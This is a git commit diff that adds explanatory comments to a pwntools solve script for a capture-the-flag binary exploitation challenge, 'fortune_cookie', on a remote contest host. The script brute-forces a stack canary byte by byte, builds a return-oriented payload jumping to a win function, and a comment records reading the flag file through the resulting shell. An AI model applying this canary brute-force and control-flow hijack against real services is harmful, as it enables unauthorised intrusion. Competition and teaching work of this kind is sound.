25438d814c925ce6376a49bbd1e68c0b19041aa0
gith-eng <135365698+gith-eng@users.noreply.github.com>
2026-04-19 19:49:58 +0200

    Comments
    Added comments for clarity on canary offset and brute force logic.

--- canary/01_fortune_cookie/solve.py
+++ canary/01_fortune_cookie/solve.py
@@ -3,11 +3,15 @@ from pwn import *
 import time
 
 HOST, PORT = 'offsec.m0lecon.it', 13547
+
+#python3 -c "from pwn import *; print(cyclic(100)) as input + debug tofind canary offset
 OFFSET_TO_CANARY = 72
+#rip offset is canary offset + canary (8B) + saved RPB (8B)
 OFFSET_TO_RIP = 88
 
 elf = ELF('./fortune_cookie', checksec=False)
 
+#lab code to brute force canary
 known = b"\x00"
 
 for i in range(7):
@@ -42,5 +46,7 @@ payload = flat(
     p64(0x000000000040101a),    # ret gadget for alignment
     p64(elf.sym.win),
 )
+
+#this went to eof immediately. I opened a new connection using the same canary and had time for one command (cat ./home/user/flag)
 io.send(payload)
 io.interactive()
